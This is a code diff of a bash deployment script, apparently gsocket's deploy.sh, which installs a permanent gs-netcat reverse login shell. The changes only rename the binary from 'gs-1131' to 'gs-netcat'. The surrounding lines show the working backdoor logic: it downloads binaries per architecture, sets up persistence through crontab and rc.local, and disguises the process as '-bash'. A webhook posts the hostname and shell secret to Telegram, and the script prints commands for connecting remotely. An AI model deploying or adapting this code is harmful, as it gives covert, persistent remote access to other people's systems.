@@ -1,6 +1,6 @@
 #! /usr/bin/env bash
 
-# Install and start a permanent gs-1131 reverse login shell
+# Install and start a permanent gs-netcat reverse login shell
 #
 # See https://www.gsocket.io/deploy/ for examples.
 #
@@ -20,13 +20,13 @@
 #		- Shorter timeout to restart crontab etc
 #       - Often used like this:
 #         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
-#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-1131 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
 # GS_USELOCAL=1
 #       - Use local binaries (do not download)
-# GS_USELOCAL_GSNC=<path to gs-1131 binary>
-#       - Use local gs-1131 from source tree
+# GS_USELOCAL_GSNC=<path to gs-netcat binary>
+#       - Use local gs-netcat from source tree
 # GS_NOSTART=1
-#       - Do not start gs-1131 (for testing purpose only)
+#       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install gsocket
 # GS_OSARCH=x86_64-alpine
@@ -87,7 +87,7 @@ unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='$(hostname) --- $(uname -rom) --- gs-1131 -i -s ${GS_SECRET}'
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
 # GS_TG_TOKEN="5794110125:AAFDNb..."
 # GS_TG_CHATID="-8834838..."
@@ -630,51 +630,51 @@ init_vars()
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
 				OSARCH="i386-alpine"
-				SRC_PKG="gs-1131_mini-linux-i686"
+				SRC_PKG="gs-netcat_mini-linux-i686"
 			elif [[ "$arch" == *"armv6"* ]]; then
 				OSARCH="arm-linux"
-				SRC_PKG="gs-1131_mini-linux-armv6"
+				SRC_PKG="gs-netcat_mini-linux-armv6"
 			elif [[ "$arch" == *"armv7l" ]]; then
 				OSARCH="arm-linux"
-				SRC_PKG="gs-1131_mini-linux-armv7l"
+				SRC_PKG="gs-netcat_mini-linux-armv7l"
 			elif [[ "$arch" == *"armv"* ]]; then
 				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
-				SRC_PKG="gs-1131_mini-linux-arm"
+				SRC_PKG="gs-netcat_mini-linux-arm"
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
-				SRC_PKG="gs-1131_mini-linux-aarch64"
+				SRC_PKG="gs-netcat_mini-linux-aarch64"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
-				SRC_PKG="gs-1131_mini-linux-mips64"
+				SRC_PKG="gs-netcat_mini-linux-mips64"
 				# Go 32-bit if Little Endian even if 64bit arch
 				is_le && {
 					OSARCH="mipsel32-alpine"
-					SRC_PKG="gs-1131_mini-linux-mipsel"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
 			elif [[ "$arch" == *mips* ]]; then
 				OSARCH="mips32-alpine"
-				SRC_PKG="gs-1131_mini-linux-mips32"
+				SRC_PKG="gs-netcat_mini-linux-mips32"
 				is_le && {
 					OSARCH="mipsel32-alpine"
-					SRC_PKG="gs-1131_mini-linux-mipsel"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
 				OSARCH="x86_64-osx" # M1
 				## FIXME: really needs M3 here..
-				SRC_PKG="gs-1131_mini-macOS-x86_64"
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
 				# OSARCH="arm64-osx" # M1
 			else
 				OSARCH="x86_64-osx"
-				SRC_PKG="gs-1131_mini-macOS-x86_64"
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
 			fi
 		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
 				OSARCH="x86_64-freebsd"
-				SRC_PKG="gs-1131_mini-freebsd-x86_64"
+				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
 		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
 				OSARCH="x86_64-openbsd"
-				SRC_PKG="gs-1131_mini-openbsd-x86_64"
+				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
 		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
 			OSARCH="i686-cygwin"
 			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
@@ -685,7 +685,7 @@ init_vars()
 		[[ -z "$OSARCH" ]] && {
 			# Default: Try Alpine(muscl libc) 64bit
 			OSARCH="x86_64-alpine"
-			SRC_PKG="gs-1131_mini-linux-x86_64"
+			SRC_PKG="gs-netcat_mini-linux-x86_64"
 		}
 	fi
 
@@ -697,7 +697,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-1131_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -1005,7 +1005,7 @@ uninstall()
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
-	uninstall_rm "${TMPDIR}/._gs-1131" # OLD
+	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove crontab
@@ -1074,7 +1074,7 @@ WARN_EXECFAIL()
 --> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
 --> Alternatively, try the static binary from
 --> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
---> ${CDC}chmod 755 gs-1131; ./gs-1131 -ilv${CN}."
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
 }
 
 HOWTO_CONNECT_OUT()
@@ -1082,7 +1082,7 @@ HOWTO_CONNECT_OUT()
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 	echo -e "--> To connect use one of the following:
---> ${CM}gs-1131 -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
 }
@@ -1191,7 +1191,7 @@ install_system_rclocal()
 	fi
 
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
-	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-1131'.
+	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
 
 	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
 
@@ -1409,8 +1409,8 @@ test_network()
 	local ret
 	unset IS_TESTNETWORK_OK
 
-	# There should be no gs-1131 listening.
-	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-1131 try the connection.
+	# There should be no gs-netcat listening.
+	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
 	# 1. Exit=0 immediatly if server exists.
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
@@ -1527,7 +1527,7 @@ try()
 	local osarch="$1"
 	local src_pkg="$2"
 
-	[[ -z "$src_pkg" ]] && src_pkg="gs-1131_${osarch}.tar.gz"
+	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
 	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
 	echo -en "Downloading binaries.................................................."
@@ -1538,18 +1538,18 @@ try()
 	if [[ "${src_pkg}" == *.tar.gz ]]; then
 		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
 		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-		[[ -f "${TMPDIR}/._gs-1131" ]] && rm -f "${TMPDIR}/._gs-1131" # from docker???
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
 		[[ -n $GS_USELOCAL_GSNC ]] && {
 			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-1131"
+			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
 		}
 	else
-		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-1131"
+		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
 	fi
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
-	xmv "${TMPDIR}/gs-1131" "$DSTBIN" || { FAIL_OUT; errexit; }
+	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
